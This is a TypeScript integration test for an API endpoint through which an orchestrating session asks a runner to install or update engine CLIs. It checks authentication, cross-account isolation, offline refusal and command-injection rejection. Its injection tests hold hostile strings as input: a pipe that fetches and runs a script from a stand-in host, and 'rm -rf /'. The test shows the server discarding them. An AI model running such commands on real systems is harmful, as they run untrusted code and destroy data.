/**
 * POST and GET /api/runner/runners/:id/engine-install — an engine CLI installed on one of the account's runners,
 * or the CLIs there updated, at an in-session orchestrator's request (`orbit runner install`, the
 * `runner_engine_install` MCP tool), and the runner's engine relay read back — against a real PostgreSQL that
 * `scripts/run-pg-spec.sh` migrates from empty, through the production apiserver (`build/main.js`, the whole
 * AppModule: RunnerAuthGuard, the orchestration gate, the global ValidationPipe). What it is held to:
 *
 *   (1) an orchestrating session asks an online runner of its account for an install: the web's Install
 *       (pending, on the runner row), its asking session in the apiserver's log, and the runner's next
 *       heartbeat hands it over — to that runner, not to the caller's;
 *   (2) as the runner reports, the status reads exactly as the web's GET /runners/:id/install does:
 *       installing with the command it runs, failed with what the machine said, done, and — once a heartbeat
 *       reports the engine installed — nothing in flight;
 *   (3) `mode: update` is the web's Update engines: no engine of its own, handed over as an update, its
 *       summary read as the web reads it;
 *   (4) no command reaches the runner from the caller: a body naming one is the same request without it;
 *   (5) refused, with nothing written: no runner token, no session, no credential, an account whose Session
 *       orchestration is off, another account's runner (answered as an id that names nothing), a runner the
 *       presence rule reads offline, and an engine or a mode Install does not know;
 *   (6) the web's door is as it was: the owner's login installs, and a personal access token can read the
 *       relay but not drive it — nor reach the runner door, which takes a runner credential alone.
 *
 *   bash scripts/run-pg-spec.sh src/apiserver/src/runner-api/runner-engine-install.pg.spec.ts
 *
 * Not destructive: every row belongs to users this run creates.
 */
import assert from 'node:assert/strict';
import { createHash, randomBytes, randomUUID } from 'node:crypto';
import { setTimeout as sleep } from 'node:timers/promises';
import { test } from 'node:test';
import { JwtService } from '@nestjs/jwt';
import { Prisma, RunStatus, SessionDispatchOrigin, type PrismaClient } from '@prisma/client';
import type { RunnerInstallState } from '@orbit/shared';
import { Client } from 'pg';

import { call, startApiserver, type Apiserver, type Reply } from '../auth/pat-test-apiserver';
import { prismaClientFor } from '../prisma/prisma-client';
import {
  assertCoordinatorPgUrlIsIsolated,
  verifyCoordinatorPgIdentity,
} from '../projects/coordinator-pg-test-safety';

const URL = process.env.COORDINATOR_PG_URL;
const RUN = randomUUID().slice(0, 8);
const MINUTE = 60_000;

const sha256 = (text: string) => createHash('sha256').update(text).digest('hex');

/** What the runner reports it runs for Claude Code (doctor.go's installCmd). */
const CLAUDE_INSTALL = 'curl -fsSL https://claude.ai/install.sh | bash';
const IDLE: RunnerInstallState = { status: null, engine: null, command: null, message: null, mode: null };

test('POST/GET /api/runner/runners/:id/engine-install: the web’s engine relay, for an orchestrating session, on its own account’s online runners', {
  skip: !URL, concurrency: 1, timeout: 600_000,
}, async (t) => {
  const url = URL!;
  assertCoordinatorPgUrlIsIsolated(url);
  const sql = new Client({ connectionString: url, connectionTimeoutMillis: 5_000 });
  await sql.connect();
  const db: PrismaClient = prismaClientFor(url);
  const jwtSecret = `runner-engine-install-spec-${randomUUID()}`;
  const jwt = new JwtService({ secret: jwtSecret, signOptions: { expiresIn: '1h' } });
  let server: Apiserver | null = null;
  t.after(async () => {
    await server?.stop().catch(() => undefined);
    await db.$disconnect().catch(() => undefined);
    await sql.end().catch(() => undefined);
  });
  await verifyCoordinatorPgIdentity(sql);
  server = await startApiserver(url, jwtSecret);

  async function owner(name: string) {
    const id = randomUUID();
    const email = `${name}-${RUN}@runner-engine-install.test`;
    await db.user.create({ data: { id, email, name, passwordHash: 'x' } });
    return { id, login: () => jwt.signAsync({ sub: id, email }) };
  }
  async function runner(ownerId: string, name: string, data: Partial<Prisma.RunnerUncheckedCreateInput> = {}) {
    const id = randomUUID();
    const token = randomBytes(32).toString('base64url');
    await db.runner.create({
      data: { id, ownerId, name: `${name}-${RUN}`, tokenHash: sha256(token), status: 'ONLINE', ...data },
    });
    return { id, token };
  }
  const beat = (runnerId: string, agoMs: number) =>
    db.runnerPresence.create({ data: { runnerId, lastBeatAt: new Date(Date.now() - agoMs), linkState: 'HTTP' } });
  /**
   * A machine a session runs on, and that session with the credential `orbit mcp` holds for it. Its own record
   * is two hours ahead, as the census's is, so no reaper reads it offline while the run asks as it.
   */
  async function caller(ownerId: string, name: string) {
    const machine = await runner(ownerId, name, { lastHeartbeatAt: new Date(Date.now() + 2 * 3_600_000) });
    const workspaceId = randomUUID();
    await db.workspace.create({ data: { id: workspaceId, ownerId, runnerId: machine.id, name: `${name}-workspace-${RUN}`, enabled: true } });
    const sessionId = randomUUID();
    await db.session.create({
      data: {
        id: sessionId, ownerId, creatorId: ownerId, workspaceId, assignedRunnerId: machine.id, title: `${name} orchestrator`,
        prompt: 'install an engine', provider: 'claude', providerBuiltin: true, status: RunStatus.AWAITING_INPUT,
        runtimeSessionId: randomUUID(), startedAt: new Date(), runClaimedAt: new Date(), dispatchOrigin: SessionDispatchOrigin.USER,
      },
    });
    const issued = await call(server!, 'POST', `/api/runner/sessions/${sessionId}/orchestration-credential`, machine.token);
    assert.equal(issued.status, 200, issued.text);
    const credential = issued.json.orchestrationToken as string;
    return {
      ...machine,
      sessionId,
      headers: { 'x-orbit-session-id': sessionId, 'x-orbit-session-token': credential } as Record<string, string>,
    };
  }

  const alice = await owner('alice');
  const bob = await owner('bob');
  const aliceLogin = await alice.login();
  const aliceCalls = await caller(alice.id, 'alice-caller');
  const bobCalls = await caller(bob.id, 'bob-caller');

  // The machine an engine goes on: online by a presence beat a moment ago, and Claude Code not on it yet.
  const box = await runner(alice.id, 'box', {
    lastHeartbeatAt: new Date(Date.now() - 10 * MINUTE),
    engines: [{ engine: 'claude', installed: false, auth: 'unknown' }, { engine: 'codex', installed: true, version: '0.164.0', auth: 'no' }],
  });
  await beat(box.id, 5_000);
  // Each way a runner reads offline to the web list: signed off a moment ago, silent past the line while its row
  // still says ONLINE, and never heard from at all.
  const signedOff = await runner(alice.id, 'signed-off', { status: 'OFFLINE', lastHeartbeatAt: new Date(Date.now() - 40 * MINUTE) });
  await beat(signedOff.id, 5_000);
  const silent = await runner(alice.id, 'silent', { lastHeartbeatAt: new Date(Date.now() - 40 * MINUTE) });
  await beat(silent.id, 10 * MINUTE);
  const never = await runner(alice.id, 'never-heard');
  // Another of the account's machines, online and idle, and another account's.
  const bystander = await runner(alice.id, 'bystander');
  await beat(bystander.id, 5_000);
  const theirs = await runner(bob.id, 'their-box');
  await beat(theirs.id, 5_000);

  const path = (runnerId: string) => `/api/runner/runners/${runnerId}/engine-install`;
  const ask = (who: { token?: string; headers: Record<string, string> }, runnerId: string, body: unknown) =>
    call(server!, 'POST', path(runnerId), who.token, body, who.headers);
  const status = (who: { token?: string; headers: Record<string, string> }, runnerId: string) =>
    call(server!, 'GET', path(runnerId), who.token, undefined, who.headers);
  /** What the web's runner page reads for the same machine: the owner's own route. */
  const webStatus = (runnerId: string) => call(server!, 'GET', `/api/runners/${runnerId}/install`, aliceLogin);
  /** The status both doors give, which must be the same. */
  const bothRead = async (runnerId: string): Promise<RunnerInstallState> => {
    const [agent, web] = await Promise.all([status(aliceCalls, runnerId), webStatus(runnerId)]);
    assert.equal(agent.status, 200, agent.text);
    assert.equal(web.status, 200, web.text);
    assert.deepEqual(agent.json, web.json, 'the agent reads the relay as the web’s runner page does');
    return agent.json as RunnerInstallState;
  };
  /** One heartbeat of the runner's own process, and the install it is handed. */
  const heartbeat = async (machine: { token: string }, body: Record<string, unknown> = {}) => {
    const reply = await call(server!, 'POST', '/api/runner/heartbeat', machine.token, body);
    assert.ok(reply.status === 200 || reply.status === 201, `heartbeat: ${reply.status} ${reply.text}`);
    return reply.json.installRequest as Record<string, unknown> | undefined;
  };
  const report = async (machine: { token: string }, body: Record<string, unknown>) => {
    const reply = await call(server!, 'POST', '/api/runner/install-result', machine.token, body);
    assert.equal(reply.status, 200, reply.text);
  };
  /** The runner row's whole relay slot, to tell a refused request wrote nothing. */
  const slot = async (runnerId: string) =>
    db.runner.findUniqueOrThrow({
      where: { id: runnerId },
      select: { installStatus: true, installEngine: true, installCommand: true, installMessage: true, installAt: true, installMode: true },
    });
  const loggedLine = async (line: string) => {
    for (let i = 0; i < 40 && !server!.output().includes(line); i += 1) await sleep(50);
    return server!.output().includes(line);
  };

  await t.test('(1) an install on an online runner of the account: pending on its row, logged with its session, handed over on its next heartbeat', async () => {
    const asked = await ask(aliceCalls, box.id, { engine: 'claude' });
    assert.equal(asked.status, 201, asked.text);
    assert.deepEqual(asked.json, { status: 'pending', engine: 'claude', command: null, message: null, mode: 'install' });
    const row = await slot(box.id);
    assert.deepEqual({ ...row, installAt: undefined }, {
      installStatus: 'pending', installEngine: 'claude', installCommand: null, installMessage: null, installAt: undefined, installMode: 'install',
    });
    assert.ok(row.installAt, 'started now, which is what the relay times out from');
    assert.equal(
      await loggedLine(`session ${aliceCalls.sessionId} (runner ${aliceCalls.id}) asked runner ${box.id} to install claude`),
      true,
      'the apiserver logs which session asked, from which runner, for which machine and engine',
    );
    assert.deepEqual(await bothRead(box.id), asked.json);

    assert.equal(await heartbeat(bystander), undefined, 'another machine of the account is not handed it');
    assert.deepEqual(
      await heartbeat(box),
      { engine: 'claude', attempt: row.installAt!.toISOString(), mode: 'install' },
      'the target runner’s next heartbeat hands it over, and names no command',
    );
  });

  await t.test('(2) as the runner reports, the status reads as the web’s: installing, failed, done, then nothing in flight', async () => {
    await report(box, { status: 'installing', command: CLAUDE_INSTALL });
    assert.deepEqual(await bothRead(box.id), { status: 'installing', engine: 'claude', command: CLAUDE_INSTALL, message: null, mode: 'install' });
    const failure = `exit status 1: curl: (6) Could not resolve host: claude.ai\nTry instead: npm i -g @anthropic-ai/claude-code`;
    await report(box, { status: 'failed', command: CLAUDE_INSTALL, message: failure });
    assert.deepEqual(await bothRead(box.id), { status: 'failed', engine: 'claude', command: CLAUDE_INSTALL, message: failure, mode: 'install' });

    // Asked again: a new attempt, which the next heartbeat hands over as such.
    const again = await ask(aliceCalls, box.id, { engine: 'claude', mode: 'install' });
    assert.equal(again.status, 201, again.text);
    assert.deepEqual(again.json, { status: 'pending', engine: 'claude', command: null, message: null, mode: 'install' });
    const handed = await heartbeat(box);
    assert.equal(handed?.engine, 'claude');
    assert.equal(handed?.attempt, (await slot(box.id)).installAt!.toISOString());
    await report(box, { status: 'installing', command: CLAUDE_INSTALL });
    await report(box, { status: 'done', command: CLAUDE_INSTALL });
    assert.deepEqual(await bothRead(box.id), { status: 'done', engine: 'claude', command: CLAUDE_INSTALL, message: null, mode: 'install' });
    // The heartbeat that reports it installed retires it, for both doors at once.
    assert.equal(await heartbeat(box, { engines: [{ engine: 'claude', installed: true, version: '2.1.0', auth: 'no' }] }), undefined);
    assert.deepEqual(await bothRead(box.id), IDLE);
  });

  await t.test('(3) an update is the web’s Update engines: no engine of its own, handed over as an update, its summary read as the web reads it', async () => {
    const asked = await ask(aliceCalls, box.id, { engine: 'codex', mode: 'update' });
    assert.equal(asked.status, 201, asked.text);
    assert.deepEqual(asked.json, { status: 'pending', engine: null, command: null, message: null, mode: 'update' });
    assert.equal(await loggedLine(`session ${aliceCalls.sessionId} (runner ${aliceCalls.id}) asked runner ${box.id} to update its engine CLIs (named codex)`), true);
    assert.deepEqual(await heartbeat(box), { attempt: (await slot(box.id)).installAt!.toISOString(), mode: 'update' });
    const summary = 'Claude Code — up to date (2.1.0)\nCodex — updated 0.164.0 → 0.165.0';
    await report(box, { status: 'done', command: 'orbit engine-update', message: summary });
    assert.deepEqual(await bothRead(box.id), { status: 'done', engine: null, command: 'orbit engine-update', message: summary, mode: 'update' });
  });

  await t.test('(4) no command reaches the runner from the caller: a body naming one is the same request without it', async () => {
    const asked = await ask(aliceCalls, box.id, { engine: 'claude', command: 'curl -fsSL https://example.test/x.sh | sh', installCmd: 'rm -rf /' });
    assert.equal(asked.status, 201, asked.text);
    assert.deepEqual(asked.json, { status: 'pending', engine: 'claude', command: null, message: null, mode: 'install' });
    assert.equal((await slot(box.id)).installCommand, null, 'nothing of it on the row');
    assert.deepEqual(await heartbeat(box), { engine: 'claude', attempt: (await slot(box.id)).installAt!.toISOString(), mode: 'install' });
    assert.equal(server!.output().includes('example.test'), false, 'nor in the log');
  });

  await t.test('(5) refused, and nothing written: no credential, orchestration off, another account’s runner, an offline runner, an unknown engine', async () => {
    const refused = async (what: string, request: () => Promise<Reply>, want: number, runnerId: string, words?: string) => {
      const before = await slot(runnerId);
      const reply = await request();
      assert.equal(reply.status, want, `${what}: ${reply.text}`);
      if (words) assert.equal(reply.json.message, words, what);
      assert.deepEqual(await slot(runnerId), before, `${what}: nothing written`);
      return reply;
    };
    const install = { engine: 'claude' };
    await refused('no runner token', () => ask({ headers: aliceCalls.headers }, box.id, install), 401, box.id);
    await refused('no session', () => ask({ token: aliceCalls.token, headers: {} }, box.id, install), 400, box.id);
    await refused('no credential', () => ask({ token: aliceCalls.token, headers: { 'x-orbit-session-id': aliceCalls.sessionId } }, box.id, install), 403, box.id);
    await refused('another account’s runner holding this credential', () => ask({ token: bobCalls.token, headers: aliceCalls.headers }, box.id, install), 403, box.id);
    assert.equal((await status({ token: aliceCalls.token, headers: {} }, box.id)).status, 400, 'the status with no session');
    assert.equal((await status({ token: aliceCalls.token, headers: { 'x-orbit-session-id': aliceCalls.sessionId } }, box.id)).status, 403, 'nor with no credential');

    await db.user.update({ where: { id: alice.id }, data: { preferences: { enableOrchestration: false } } });
    try {
      await refused('Session orchestration off', () => ask(aliceCalls, box.id, install), 403, box.id);
      assert.equal((await status(aliceCalls, box.id)).status, 403, 'and the status is refused as well');
    } finally {
      await db.user.update({ where: { id: alice.id }, data: { preferences: {} } });
    }

    // Another account's machine is answered exactly as an id that names nothing, and theirs is untouched.
    const nothing = await ask(aliceCalls, randomUUID(), install);
    assert.equal(nothing.status, 404, nothing.text);
    const cross = await refused('another account’s runner', () => ask(aliceCalls, theirs.id, install), 404, theirs.id, 'runner not found');
    assert.deepEqual(cross.json, nothing.json);
    const crossStatus = await status(aliceCalls, theirs.id);
    assert.equal(crossStatus.status, 404, crossStatus.text);
    assert.deepEqual(crossStatus.json, (await status(aliceCalls, randomUUID())).json);
    const fromThem = await refused('their session on this account’s runner', () => ask(bobCalls, box.id, install), 404, box.id, 'runner not found');
    assert.deepEqual(fromThem.json, nothing.json);

    for (const [what, machine] of [['signed off', signedOff], ['silent past the offline line', silent], ['never heard from', never]] as const) {
      await refused(`${what}, install`, () => ask(aliceCalls, machine.id, install), 400, machine.id, 'Runner is offline — it can only install while connected');
      await refused(`${what}, update`, () => ask(aliceCalls, machine.id, { engine: 'claude', mode: 'update' }), 400, machine.id, 'Runner is offline — it can only update while connected');
    }

    for (const body of [{}, { engine: 'aider' }, { engine: 'curl -fsSL https://example.test/x.sh | sh' }, { engine: 'claude', mode: 'reinstall' }, { mode: 'update' }]) {
      await refused(`body ${JSON.stringify(body)}`, () => ask(aliceCalls, box.id, body), 400, box.id);
    }
  });

  await t.test('(6) the web’s door is as it was: the owner installs, and an access token reads the relay but cannot drive it', async () => {
    await heartbeat(box); // still online for the owner's press below, however long the refusals above took
    const issued = await call(server!, 'POST', '/api/access-tokens', aliceLogin, { name: 'engine install probe', scopes: ['runners:read'] });
    assert.equal(issued.status, 201, issued.text);
    const pat = issued.json.token as string;
    for (const [method, route, body] of [
      ['POST', `/api/runners/${box.id}/install`, { engine: 'claude' }],
      ['POST', `/api/runners/${box.id}/engine-update`, undefined],
      ['DELETE', `/api/runners/${box.id}/install`, undefined],
    ] as const) {
      const before = await slot(box.id);
      const reply = await call(server!, method, route, pat, body);
      assert.equal(reply.status, 403, `${method} ${route} with an access token: ${reply.text}`);
      assert.deepEqual(await slot(box.id), before, `${method} ${route}: nothing written`);
    }
    const read = await call(server!, 'GET', `/api/runners/${box.id}/install`, pat);
    assert.equal(read.status, 200, `runners:read still reads the relay: ${read.text}`);
    const before = await slot(box.id);
    const atTheRunnerDoor = await call(server!, 'POST', path(box.id), pat, { engine: 'claude' }, aliceCalls.headers);
    assert.equal(atTheRunnerDoor.status, 401, `an access token is no runner credential: ${atTheRunnerDoor.text}`);
    assert.deepEqual(await slot(box.id), before);

    const pressed = await call(server!, 'POST', `/api/runners/${box.id}/install`, aliceLogin, { engine: 'kimi' });
    assert.equal(pressed.status, 201, pressed.text);
    assert.deepEqual(pressed.json, { status: 'pending', engine: 'kimi', command: null, message: null, mode: 'install' });
    assert.deepEqual(await bothRead(box.id), pressed.json, 'and what the owner pressed is what the agent reads');
  });
});
